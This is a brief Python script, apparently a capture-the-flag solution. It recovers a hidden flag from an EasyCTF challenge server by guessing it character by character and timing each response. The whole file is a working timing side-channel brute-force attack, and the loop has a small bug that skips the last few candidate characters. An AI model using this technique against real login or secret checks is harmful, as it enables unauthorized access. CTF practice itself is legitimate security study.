from socket import *
import threading
import time
flag = []
i = 0
Max = -1
index = 0
value = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{"+"}14!"
while 1:
	s=socket(AF_INET,SOCK_STREAM)  
	s.connect(("c1.easyctf.com",12482))

	recvdata = s.recv(1000)
	print(recvdata)  
	time.sleep(0.1)

	start_time = time.time()
	if i==0:
		flag.append(value[i])
	flag[index] = value[i]
	flag_encode = ''.join(flag)+"\n"

	s.send(flag_encode.encode())
	print(flag_encode)
	recvdata = s.recv(1000)
	time.sleep(0.1)
	print(recvdata)
	
	end = time.time() - start_time
	print(end)
	if end > Max:
		Max = end
		Max_index = i
	i += 1
	if i == 55:
		i = 0
		Max = -1
		flag[index] = value[Max_index]
		index += 1

s.close()
